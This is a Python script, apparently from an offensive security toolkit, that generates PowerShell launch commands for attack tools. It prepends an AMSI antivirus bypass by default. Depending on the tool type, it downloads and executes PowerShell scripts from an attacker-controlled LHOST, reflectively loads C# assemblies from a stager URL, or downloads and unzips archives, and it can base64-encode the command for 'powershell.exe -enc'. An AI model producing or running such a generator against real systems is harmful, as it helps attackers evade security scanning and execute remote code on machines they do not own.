#!/bin/env python3
import ak
import argparse
import base64
import os
import sys
import yaml

def b64_encode(s):
  b64_encoded = base64.b64encode(s.encode('utf-16le'))
  b64_str = b64_encoded.decode("utf-8")
  return b64_str

def get_tool(tool_name, cs_tools, ps_tools, zip_tools):
  if tool_name in cs_tools.keys():
    tool_type = 'cs'
    tool = cs_tools[tool_name]
  elif tool_name in zip_tools.keys():
    tool_type = 'zip'
    tool = zip_tools[tool_name]
  elif tool_name in ps_tools.keys():
    tool_type = 'ps'
    tool = ps_tools[tool_name]

  return tool,tool_type

def main():
  cs_tools = ak.conf['cs_tools']
  ps_tools = ak.conf['ps_tools']
  zip_tools = ak.conf['zip_tools']

  all_tools = list(cs_tools.keys())
  all_tools += ps_tools.keys()
  all_tools += zip_tools.keys()

  parser = argparse.ArgumentParser()
  parser.add_argument('--amsi', default=True, action=argparse.BooleanOptionalAction)
  parser.add_argument('--base64', '-b', action=argparse.BooleanOptionalAction)
  parser.add_argument('tool', choices=all_tools)

  args = parser.parse_args()

  tool,tool_type = get_tool(args.tool, cs_tools, ps_tools, zip_tools)

  if not os.path.exists(ak.WEBROOT + "/" + tool['location']):
    print("WARNING: Tool not found at: " + ak.WEBROOT + "/" + tool['location'] + "\r\n")

  s = ""

  if args.amsi:
    s += ak.PS_AMSI + ';'

  if tool_type == 'ps':
    s += ak.PS_IEX_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'])

    if 'cmd' in tool.keys():
      s += ';' + tool['cmd']

  elif tool_type == 'cs':
    tool_class = tool['class']
    tool_entrypoint = tool.get('entrypoint', "Main")
    cmd = tool.get('cmd', "")

    cmd = cmd.replace("STAGER_URL", ak.STAGER_URL)

    s += ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST, tool=tool['location'], tool_class=tool_class, entrypoint=tool_entrypoint, cmd=cmd )

  elif tool_type == 'zip':
    s += ak.PS_UNZIP_CMD.format(LHOST=ak.LHOST, tool=tool['location'])
  else:
    print(f"Invalid type {tool_type} for command {tool}")
    sys.exit(1)

  if 'method' in tool.keys():
    s+= ';' + tool['method']

  if args.base64:
    s = b64_encode(s)
    print("Run with: powershell.exe -enc "+s)
  else:
    print(s + "\n")

  if 'alt' in tool.keys():
    print("NOTE: Consider using {} tool".format(tool['alt']))

if __name__ == "__main__":
  main()
